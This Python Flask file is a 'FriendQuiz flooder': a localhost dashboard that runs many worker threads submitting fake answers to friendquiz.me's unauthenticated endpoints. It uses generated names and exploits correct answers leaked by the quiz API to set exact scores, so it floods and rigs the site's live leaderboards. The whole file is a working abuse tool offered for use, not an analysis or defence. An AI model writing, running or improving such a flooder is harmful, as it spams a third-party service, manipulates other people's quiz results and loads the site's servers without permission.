"""Local dashboard for the FriendQuiz flooder.

Serves a browser UI on localhost and runs the flooding engine in the
background, exposing live stats, score targeting and pause/resume via a
small JSON API. All heavy lifting (answer submission, leaderboard reads)
is done server-side so the browser never talks to FriendQuiz directly.
"""

import itertools
import json
import os
import random
import string
import threading
import time
import webbrowser
from collections import deque

import requests
from flask import Flask, jsonify, request, send_from_directory

# --- FriendQuiz endpoints (unauthenticated, form-encoded) ---
API = "https://friendquiz.me"
QUIZ_URL = f"{API}/api/quiz.php"
ANSWER_URL = f"{API}/api/answer.php"
BOARD_URL = f"{API}/api/board.php"

HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(HERE, "config.json")
PORT = int(os.environ.get("PORT", "5000"))
HOST = os.environ.get("HOST", "127.0.0.1")

# --- Default dashboard settings, overridable from the UI and saved ---
DEFAULTS = {
    "code": "",
    "count": 100,
    "threads": 8,
    "delay_ms": 0,
    "score_mode": "random",
    "exact_score": 10,
    "min_score": 0,
    "max_score": 10,
    "name_mode": "random",
    "prefix": "",
    "suffix": "",
    "min_len": 3,
    "max_len": 8,
    "letters": True,
    "digits": True,
    "names_list": "",
}

app = Flask(__name__, static_folder="static", static_url_path="/static")


class Engine:
    """Runs the flooding workers and keeps track of their progress."""

    def __init__(self):
        self.lock = threading.Lock()
        self.config = dict(DEFAULTS)
        self._load_config()
        self.quiz = None
        self.running = False
        self.paused = False
        self._stop = threading.Event()
        self._pause = threading.Event()
        self._pause.set()
        self.workers = []
        self.counter = itertools.count(1)
        self.stats = None
        self.log = deque(maxlen=400)
        self.rate_ts = deque(maxlen=2000)
        self.board = None
        self.board_code = None
        self.board_at = 0.0

    def _load_config(self):
        """Load previously saved settings from disk, if any."""
        if os.path.exists(CONFIG_PATH):
            try:
                with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, dict):
                    self.config.update(data)
            except Exception:
                pass

    def save_config(self):
        """Persist the current settings so the UI restores them next time."""
        try:
            with open(CONFIG_PATH, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def _log(self, kind, text):
        """Append a line to the activity feed shown in the dashboard."""
        self.log.append({"t": time.strftime("%H:%M:%S"), "kind": kind, "text": text})

    def load_quiz(self, code):
        """Fetch the quiz definition and cache it for later payloads."""
        r = requests.get(QUIZ_URL, params={"code": code}, timeout=15)
        r.raise_for_status()
        q = r.json()
        if not q.get("questions"):
            raise ValueError(f"no questions found for code '{code}'")
        self.quiz = q
        return q

    def _pick_score(self):
        """Choose the target score for one submission based on the mode."""
        n = len(self.quiz["questions"])
        m = self.config["score_mode"]
        if m == "perfect":
            return n
        if m == "exact":
            return max(0, min(n, int(self.config.get("exact_score", n))))
        if m == "range":
            lo = max(0, min(n, int(self.config.get("min_score", 0))))
            hi = max(0, min(n, int(self.config.get("max_score", n))))
            if hi < lo:
                lo, hi = hi, lo
            return random.randint(lo, hi)
        return random.randint(0, n)

    def _name(self):
        """Generate a name according to the configured name strategy."""
        cfg = self.config
        if cfg["name_mode"] == "counter":
            return f"{cfg['prefix']}{next(self.counter)}{cfg['suffix']}"
        if cfg["name_mode"] == "list":
            names = [x.strip() for x in cfg["names_list"].replace("\n", ",").split(",") if x.strip()]
            if names:
                return names[(next(self.counter) - 1) % len(names)]
        charset = ""
        if cfg.get("letters"):
            charset += string.ascii_letters
        if cfg.get("digits"):
            charset += string.digits
        if not charset:
            charset = string.ascii_letters
        lo = max(1, int(cfg.get("min_len", 3)))
        hi = max(lo, int(cfg.get("max_len", 8)))
        length = random.randint(lo, hi)
        return cfg["prefix"] + "".join(random.choices(charset, k=length)) + cfg["suffix"]

    def _payload(self, name):
        """Build the form payload, hitting the requested score exactly.

        We know the correct answers up front (the quiz API returns them in
        the ``values`` field), so reaching an exact score is just a matter
        of answering that many questions correctly and guessing the rest.
        """
        qs = self.quiz["questions"]
        values = self.quiz.get("values") or []
        n = len(qs)
        score = self._pick_score()
        # Pick which questions to answer correctly this round.
        correct = set(random.sample(range(n), score)) if values else set()
        data = {"code": self.quiz["code"], "name": name}
        for i, q in enumerate(qs):
            opts = q["options"]
            if values and i < len(values) and i in correct:
                data[f"q{i + 1}"] = values[i]
            else:
                pool = [o for o in opts]
                if values and i < len(values):
                    pool = [o for o in opts if o["option_id"] != values[i]] or pool
                data[f"q{i + 1}"] = random.choice(pool)["option_id"]
        return data

    def _worker(self, share):
        """Submit answers until this worker's share is done (-1 = unlimited)."""
        session = requests.Session()
        delay = float(self.config.get("delay_ms", 0)) / 1000.0
        sent = 0
        nq = len(self.quiz["questions"])
        while share < 0 or sent < share:
            if self._stop.is_set():
                return
            self._pause.wait(0.2)
            if self._stop.is_set():
                return
            name = self._name()
            try:
                r = session.post(ANSWER_URL, data=self._payload(name), timeout=20)
                r.raise_for_status()
                sc = int(r.json().get("score", 0))
                with self.lock:
                    self.stats["ok"] += 1
                    self.stats["score_sum"] += sc
                    self.stats["scores"][sc] += 1
                    self.rate_ts.append(time.time())
                    self.stats["last"] = {"name": name, "score": sc}
                self._log("ok", f"{name}  →  {sc}/{nq}")
            except Exception as e:
                with self.lock:
                    self.stats["fail"] += 1
                self._log("err", f"{name}  →  {type(e).__name__}: {e}")
            sent += 1
            if delay:
                time.sleep(delay)

    def start(self, cfg):
        """Begin flooding with the given settings, spawning worker threads."""
        if self.running:
            return {"ok": False, "error": "already running"}
        code = (cfg.get("code") or self.config["code"]).strip()
        if not code:
            return {"ok": False, "error": "quiz code is required"}
        if not self.quiz or self.quiz.get("code") != code:
            self.load_quiz(code)
        self.config.update(cfg)
        self.config["code"] = code
        self.save_config()
        self._stop.clear()
        self._pause.set()
        self.paused = False
        total = max(0, int(self.config.get("count", 0)))
        n_threads = max(1, min(64, int(self.config.get("threads", 8))))
        nq = len(self.quiz["questions"])
        self.stats = {
            "total": total,
            "ok": 0,
            "fail": 0,
            "score_sum": 0,
            "scores": [0] * (nq + 1),
            "started": time.time(),
            "last": None,
        }
        self.counter = itertools.count(1)
        self.rate_ts.clear()
        share = -1 if total <= 0 else -(-total // n_threads)
        self.workers = [
            threading.Thread(target=self._worker, args=(share,), daemon=True)
            for _ in range(n_threads)
        ]
        self.running = True
        for w in self.workers:
            w.start()
        self._log("sys", f"started: {n_threads} workers → {total if total else 'unlimited'}")
        return {"ok": True}

    def stop(self):
        """Signal all workers to stop and wait for them to exit."""
        if not self.running:
            return {"ok": True}
        self._stop.set()
        for w in self.workers:
            w.join(timeout=5)
        self.running = False
        self.paused = False
        self._log("sys", "stopped")
        return {"ok": True}

    def pause(self):
        """Freeze all workers in place (they block until resumed)."""
        if not self.running:
            return {"ok": False, "error": "not running"}
        self.paused = True
        self._pause.clear()
        self._log("sys", "paused")
        return {"ok": True}

    def resume(self):
        if not self.running:
            return {"ok": False, "error": "not running"}
        self.paused = False
        self._pause.set()
        self._log("sys", "resumed")
        return {"ok": True}

    def status(self):
        """Snapshot of everything the dashboard needs for its next render."""
        with self.lock:
            st = dict(self.stats) if self.stats else None
            log = list(self.log)
        info = None
        if self.quiz:
            info = {
                "title": self.quiz.get("title"),
                "name": self.quiz.get("name"),
                "code": self.quiz.get("code"),
                "questions": len(self.quiz.get("questions") or []),
                "values": bool(self.quiz.get("values")),
            }
        now = time.time()
        # Throughput estimate: successes seen in the last 10 seconds.
        rate = 0.0
        if self.rate_ts:
            cutoff = now - 10
            recent = [t for t in self.rate_ts if t >= cutoff]
            rate = len(recent) / 10.0
        remaining = 0
        elapsed = 0.0
        eta = None
        if st:
            elapsed = now - st["started"]
            remaining = st["total"] - (st["ok"] + st["fail"]) if st["total"] > 0 else 0
            if rate > 0 and remaining > 0:
                eta = remaining / rate
        return {
            "running": self.running,
            "paused": self.paused,
            "stats": st,
            "quiz": info,
            "rate": round(rate, 2),
            "remaining": max(0, remaining),
            "elapsed": round(elapsed, 1),
            "eta": round(eta, 1) if eta is not None else None,
            "log": log,
        }

    def board_data(self, code):
        """Read the live leaderboard, caching it for a few seconds."""
        if self.board and self.board_code == code and time.time() - self.board_at < 3:
            return self.board
        try:
            r = requests.get(BOARD_URL, params={"code": code}, timeout=15)
            r.raise_for_status()
            self.board = r.json()
            self.board_code = code
            self.board_at = time.time()
            return self.board
        except Exception:
            return {"error": "board unavailable"}


engine = Engine()


# --- Routes -----------------------------------------------------------

@app.get("/")
def index():
    return send_from_directory(app.static_folder, "dashboard.html")


@app.get("/api/config")
def get_config():
    return jsonify({"config": engine.config})


@app.post("/api/config")
def post_config():
    data = request.get_json(force=True, silent=True) or {}
    engine.config.update(data)
    engine.save_config()
    return jsonify({"config": engine.config})


@app.post("/api/load_quiz")
def load_quiz():
    data = request.get_json(force=True, silent=True) or {}
    code = (data.get("code") or engine.config["code"]).strip()
    try:
        q = engine.load_quiz(code)
        return jsonify({
            "ok": True,
            "quiz": {
                "title": q.get("title"),
                "name": q.get("name"),
                "code": q.get("code"),
                "questions": len(q.get("questions") or []),
                "values": bool(q.get("values")),
            },
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


@app.post("/api/start")
def start():
    data = request.get_json(force=True, silent=True) or {}
    try:
        return jsonify(engine.start(data))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


@app.post("/api/stop")
def stop():
    return jsonify(engine.stop())


@app.post("/api/pause")
def pause():
    return jsonify(engine.pause())


@app.post("/api/resume")
def resume():
    return jsonify(engine.resume())


@app.get("/api/status")
def status():
    return jsonify(engine.status())


@app.get("/api/board")
def board():
    code = (request.args.get("code") or engine.config["code"]).strip()
    return jsonify(engine.board_data(code))


if __name__ == "__main__":
    print(f"[*] FriendQuiz Flooder dashboard running at http://{HOST}:{PORT}")
    if HOST in ("127.0.0.1", "localhost"):
        threading.Timer(1.0, lambda: webbrowser.open(f"http://127.0.0.1:{PORT}")).start()
    app.run(host=HOST, port=PORT, threaded=True)